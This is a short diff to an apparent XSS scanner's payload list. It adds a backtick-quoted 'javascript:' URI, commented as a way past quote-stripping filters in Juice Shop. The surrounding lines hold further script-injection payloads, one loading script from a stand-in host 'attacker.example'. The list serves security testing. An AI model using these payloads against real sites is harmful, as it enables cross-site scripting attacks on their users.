@@ -62,6 +62,8 @@ URL_ATTR = [
     "javascript:void(alert('{marker}'))",
     "data:text/html,<script>alert('{marker}')</script>",
     "//attacker.example/xss.js?{marker}",
+    # Juice Shop DOM/Reflected XSS: backtick JS URI (bypasses quote-stripping filters)
+    "javascript:alert(`{marker}`)",
 ]
 
 SCRIPT_SRC = [
